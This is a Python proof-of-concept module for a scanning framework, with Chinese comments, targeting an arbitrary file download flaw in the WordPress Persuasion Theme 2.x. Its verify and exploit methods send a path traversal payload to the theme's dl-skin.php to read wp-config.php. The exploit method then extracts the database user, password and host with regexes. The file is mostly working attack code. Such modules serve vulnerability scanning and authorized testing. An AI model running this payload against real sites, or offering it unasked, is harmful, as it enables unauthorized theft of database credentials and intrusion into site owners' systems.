# coding: utf-8
import re
import urllib.request
import urllib.parse
import urllib.error
import urllib.request
import urllib.error
import urllib.parse

from CScanPoc.thirdparty import requests, hackhttp
from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType


class Vuln(ABVuln):
    vuln_id = 'WordPress_0134'  # 平台漏洞编号，留空
    name = 'WordPress Persuasion Theme 2.x 任意文件下载'  # 漏洞名称
    level = VulnLevel.MED  # 漏洞危害级别
    type = VulnType.FILE_DOWNLOAD  # 漏洞类型
    disclosure_date = '2014-09-25'  # 漏洞公布时间
    desc = '''
    WordPress是一个基于PHP和MySQL的免费开源内容管理系统（CMS）。功能包括插件架构和模板系统。它与博客最相关，但支持其他类型的网络内容，包括更传统的邮件列表和论坛，媒体画廊和在线商店。截至2018年4月，超过6000万个网站使用，包括前1000万个网站的30.6％，WordPress是最受欢迎的网站管理系统正在使用中。WordPress也被用于其他应用领域，如普适显示系统（PDS）。
    WordPress Persuasion Theme 2.x 任意文件下载 ，通过此漏洞可以下载服务器上的任意可读文件。
    '''  # 漏洞描述
    ref = 'http://www.exploit-db.com/exploits/30443/'  # 漏洞来源
    cnvd_id = 'Unknown'  # cnvd漏洞编号
    cve_id = 'Unknown'  # cve编号
    product = 'WordPress'  # 漏洞应用名称
    product_version = 'WordPress Persuasion Theme 2.x'  # 漏洞应用版本


class Poc(ABPoc):
    poc_id = '1d97d9e8-29cb-4c53-8b59-1323627f7a8b'  # 平台 POC 编号，留空
    author = 'hyhmnn'  # POC编写者
    create_date = '2018-05-29'  # POC创建时间

    def __init__(self):
        super(Poc, self).__init__(Vuln())
        self.option_schema = {
            'properties': {
                'base_path': {
                    'type': 'string',
                    'description': '部署路径',
                    'default': '',
                    '$default_ref': {
                        'property': 'deploy_path'
                    }
                }
            }
        }

    def verify(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                target=self.target, vuln=self.vuln))
            vul_url = '{url}/wp-content/themes/persuasion/lib/scripts/dl-skin.php'.format(
                url=self.target)
            payload = {'_mysite_download_skin': '../../../../../wp-config.php',
                       '_mysite_delete_skin_zip': ''}
            data = urllib.parse.urlencode(payload)
            req = urllib.request.Request(vul_url, data)
            response = urllib.request.urlopen(req).read()
            if 'DB_USER' in response and 'DB_PASSWORD' in response and 'WordPress' in response:
                self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                    target=self.target, name=self.vuln.name))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))

    def exploit(self):
        self.target = self.target.rstrip(
            '/') + '/' + (self.get_option('base_path').lstrip('/'))
        try:
            self.output.info('开始对 {target} 进行 {vuln} 漏洞利用'.format(
                target=self.target, vuln=self.vuln))
            vul_url = '{url}/wp-content/themes/persuasion/lib/scripts/dl-skin.php'.format(
                url=self.target)
            payload = {'_mysite_download_skin': '../../../../../wp-config.php',
                       '_mysite_delete_skin_zip': ''}
            data = urllib.parse.urlencode(payload)
            req = urllib.request.Request(vul_url, data)
            response = urllib.request.urlopen(req).read()
            if 'DB_USER' in response and 'DB_PASSWORD' in response and 'WordPress' in response:
                match_data1 = re.compile(r'\'DB_USER\'\,(.*)\)')
                match_data2 = re.compile(r'\'DB_PASSWORD\'\,(.*)\)')
                match_data3 = re.compile(r'\'DB_HOST\'\,(.*)\)')
                data1 = match_data1.findall(response)
                data2 = match_data2.findall(response)
                data3 = match_data3.findall(response)
                self.output.report(self.vuln, '发现{target}存在{name}漏洞;vul_url={vul_url}, DB_USER={DB_USER},DB_PASSWORD={DB_PASSWORD},DB_HOST={DB_HOST}'.format(
                    target=self.target, name=self.vuln.name, vul_url=vul_url, DB_USER=data1[0], DB_PASSWORD=data2[0], DB_HOST=data3[0]))
        except Exception as e:
            self.output.info('执行异常：{}'.format(e))


if __name__ == '__main__':
    Poc().run()
